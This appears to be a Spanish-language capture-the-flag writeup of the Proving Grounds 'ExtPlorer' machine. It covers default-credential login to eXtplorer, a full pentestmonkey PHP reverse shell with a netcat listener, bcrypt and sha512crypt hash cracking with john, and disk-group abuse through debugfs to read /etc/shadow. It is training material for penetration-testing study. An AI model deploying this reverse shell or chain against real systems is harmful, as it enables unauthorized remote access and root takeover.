---
layout: single
title: PG Practice (OSCP Prep.) - ExtPlorer Writeup
excerpt: "Con esta máquina comenzamos la serie de preparación para el OSCP. Trabajaremos con Extplorer, donde abordaremos temas como exploits web, reverse shell en PHP, credenciales por defecto, abuso del grupo disk en Linux, entre otros."
date: 2025-04-07
classes: wide
header:
  teaser: /assets/images/pg-writeup-extplorer/pg_writeup_extplorer.webp
  teaser_home_page: true
  icon: /assets/images/linux_logo.webp
categories:
  - Proving Grounds Practice
  - OSCP
tags:
  - Fuzzing Web
  - Pentesting
  - FileManager
  - Disk Group Abuse - Privilege Escalation
---

El comienzo fue bastante sencillo. Al hacer fuzzing de URLs en el servidor web, encontramos una ruta interesante que utiliza credenciales por defecto. Ahora vamos a ver el proceso.

# Enumeración 

```bash
nmap -p- -sS -sCV --min-rate 5000 --open -v -n -Pn 192.168.199.16 -oN allports
```

# Puertos:
```bash
# Nmap 7.95 scan initiated Sat Mar  1 22:21:05 2025 as: /usr/bin/nmap -sCV -p22,80 -oN targeted 192.168.199.16
Nmap scan report for 192.168.199.16
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar  1 22:22:51 2025 -- 1 IP address (1 host up) scanned in 105.60 seconds
```

# Intrusión - Filemanager con credenciales predeterminadas

En el puerto 80 se muestra lo que parece ser una instalación por defecto de WordPress. La primera vez que hice la máquina, intenté conectar mi propio servidor MySQL para completar la instalación, pero en este caso no funcionará.

## Fuzzing con ffuf

Dado que no encuentro nada me dispongo a enumerar

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.199.16/FUZZ" -t 200 -ac
```

Me encuentro con lo siguiente: 
<p align="center">
<img src="/assets/images/pg-writeup-extplorer/Pasted image 20250301232354.png">
</p>

Es una ruta interesante

<p align="center">
<img src="/assets/images/pg-writeup-extplorer/Pasted image 20250301232453.png">
</p>

Dado que no tengo credenciales válidas, voy a probar las típicas para cualquier servicio: <span style="color:#E57373;">admin:admin</span>.

<p align="center">
<img src="/assets/images/pg-writeup-extplorer/Pasted image 20250301232538.png">
</p>

Y son válidas, estoy dentro 🥳

# Reverse Shell como www-data

Veo que los archivos existentes son, seguramente, parte del WordPress que está corriendo en la raíz del servidor web. Por tanto, podría intentar crear un archivo cmd.php para ejecutar comandos o lanzarme directamente una shell en PHP.

<p align="center">
<img src="/assets/images/pg-writeup-extplorer/Pasted image 20250301233216.png">
</p>

Reverse shell directamente en PHP:

Si prefieres lanzarte directamente una reverse shell en PHP, solo tienes que acceder al archivo, insertar el siguiente contenido y editarlo con tu IP y el puerto al que deseas recibir la conexión.

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Nos ponemos en escucha con **netcat**:

```bash
ncat -nvlp 443
```

Y obtenemos la **shell**:

<p align="center">
<img src="/assets/images/pg-writeup-extplorer/Pasted image 20250302000234.png">
</p>

# Movimiento Lateral a **Dora**

Enumerando un poco el servidor web, me encuentro con este archivo: `filemanager/config/.htusers.php`

```php
<?php 
	// ensure this file is being included by a parent file
	if( !defined( '_JEXEC' ) && !defined( '_VALID_MOS' ) ) die( 'Restricted access' );
	$GLOBALS["users"]=array(
	array('admin','21232f297a57a5a743894a0e4a801fc3','/var/www/html','http://localhost','1','','7',1),
	array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.************************','/var/www/html','http://localhost','1','','0',1),
); 
```

Parece que son hashes de usuarios y el usuario 'dora' existe en el sistema. Podríamos tratar de crackear el hash de 'dora' con **john**.

```bash
john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
Created directory: /root/.john
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
do******         (?)
1g 0:00:00:01 DONE (2025-03-02 00:04) 0.5154g/s 779.3p/s 779.3c/s 779.3C/s gonzalez..something
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Logramos crackear el hash, ¡podríamos probar la contraseña para el usuario **dora**!

<p align="center">
<img src="/assets/images/pg-writeup-extplorer/Pasted image 20250302000259.png">
</p>

# Escalada de Privilegios

Siguiendo con mi típica enumeración, lo que siempre hago es mirar los grupos de los usuarios para ver si se pueden aprovechar de alguna forma.

```bash
id
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
```

El usuario **dora** está en un grupo interesante: **(disk)**.

Buscando en google me encuentro con este artículo [Disk-Group-privilege-escalation](https://www.hackingarticles.in/disk-group-privilege-escalation/) (Para más información)

En el cual me encuentro esto:

<p align="center">
<img src="/assets/images/pg-writeup-extplorer/Pasted image 20250302000807.png">
</p>

Por tanto, podríamos tratar de leer el archivo `/etc/shadow` con estos comandos.

```bash
# En la máquina víctima

debugfs /dev/mapper/ubuntu--vg-ubuntu--lv # Este es el disco del sistema en cuestión
debugfs: cat /etc/shadow
```
Y este seria el contenido del `/etc/shadow`

```bash
debugfs:  cat /etc/shadow
root:<ROOT_HASH>::
daemon:*:19235:0:99999:7:::
bin:*:19235:0:99999:7:::
sys:*:19235:0:99999:7:::
sync:*:19235:0:99999:7:::
games:*:19235:0:99999:7:::
man:*:19235:0:99999:7:::
lp:*:19235:0:99999:7:::
mail:*:19235:0:99999:7:::
news:*:19235:0:99999:7:::
uucp:*:19235:0:99999:7:::
proxy:*:19235:0:99999:7:::
www-data:*:19235:0:99999:7:::
backup:*:19235:0:99999:7:::
list:*:19235:0:99999:7:::
irc:*:19235:0:99999:7:::
gnats:*:19235:0:99999:7:::
nobody:*:19235:0:99999:7:::
systemd-network:*:19235:0:99999:7:::
systemd-resolve:*:19235:0:99999:7:::
systemd-timesync:*:19235:0:99999:7:::
messagebus:*:19235:0:99999:7:::
syslog:*:19235:0:99999:7:::
_apt:*:19235:0:99999:7:::
tss:*:19235:0:99999:7:::
uuidd:*:19235:0:99999:7:::
tcpdump:*:19235:0:99999:7:::
landscape:*:19235:0:99999:7:::
pollinate:*:19235:0:99999:7:::
usbmux:*:19381:0:99999:7:::
sshd:*:19381:0:99999:7:::
systemd-coredump:!!:19381::::::
lxd:!:19381::::::
fwupd-refresh:*:19381:0:99999:7:::
dora:$6$PkzB/mtNayFM5eVp$b6LU19HBQaOqbTehc6/LEk8DC2NegpqftuDDAvOK20c6yf3dFo0esC0vOoNWHqvzF0aEb3jxk39sQ/S4vGoGm/:19453:0:99999:7:::
```
Crackeamos la contraseña de root:

```bash
john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
********         (?)
1g 0:00:00:00 DONE (2025-03-02 00:12) 1.063g/s 3540p/s 3540c/s 3540C/s adriano..cartman
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Shell como **root**

```bash
su root
```

<p align="center">
<img src="/assets/images/pg-writeup-extplorer/Pasted image 20250407202436.png">
</p>

Y somos **root** 😎

<p align="center">
<img src="/assets/images/leonardo-dicaprio-clapping.gif">
</p>

¡Perfecto, máquina completada 🥳! Gracias por leer el post, espero haber sido de ayuda. Si te gusta mi contenido, puedes encontrarme en LinkedIn y GitHub, donde suelo subir herramientas útiles.


